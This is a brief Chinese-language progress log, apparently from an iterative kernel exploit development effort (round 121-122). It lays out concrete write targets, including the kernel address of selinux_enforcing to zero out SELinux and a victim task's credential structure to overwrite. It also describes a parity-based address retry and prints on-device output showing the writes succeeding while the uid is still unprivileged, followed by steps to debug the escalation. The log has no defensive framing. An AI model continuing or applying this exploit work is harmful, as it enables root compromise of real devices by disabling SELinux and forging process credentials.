# 43499 · 三步三请求 + 奇偶重试，全部健康（round 121-122）

## 落地的两处（都以归档为据 ✓）

```cpp
// 1) 三步三种请求（归档逐字 ✓）
W1: target = 0xffffff8000000000 + selinux_enforcing(0x2daad88) + delta(0x28000000) = 0xffffff802adaad88 ✓（归档 ✓）
    mode = Zero, preserve_child = true
W2: target = spawned.task + victim_cred_off ；mode = Credential, preserve_child = true
W3: target = spawned.task                 ；mode = Zero,       preserve_child = false（leaf=1 ✓）

// 2) 奇偶重试（退役式"挑地址/重试" ✓）：
page_value = base + delta + 0x100  ⇒ Zero 路要求 ((page_value >> 16) & 1) == 1
⇒ 不合格就**再准备一次**（最多 3 次 ✓）⇒ 与退役的 w1_scratch_repair_attempts 同形 ✓
```

## 真机（本轮）

```
main: prepare parity try=1 base=0xffff800000000000 ok=1 ✓
main: layout matches=1 accepts=1 value=0xffff7ffffffff280   ← w1 通过 ✓（此前是 accepts=0 ✗）
main: layout matches=1 accepts=1 value=0x0                  ← w3 ✓
main: layout matches=1 accepts=1 value=0xffffff802abfd588   ← w2 ✓（= 归档别名 ✓）
main: step result w1 => won / w2 => won / w3 => won ✓
main: victim uid=2000 ✗
```

## 下一步（一次打印即可对照 ✓）

- 把三步的 **target 各打一行** ✓，与归档三行逐字比对（`…adaad88` ✓ / `…38e198` ✓ / `…38da00` ✓）；
- 若三者都相等 ✓ ⇒ 那就是"页面/目标/模式"全部与归档一致 ⇒ 剩余差异只在**机制内核侧** ✓；
- 若某个不等 ✗ ⇒ 立刻定位到具体那一步 ✓。
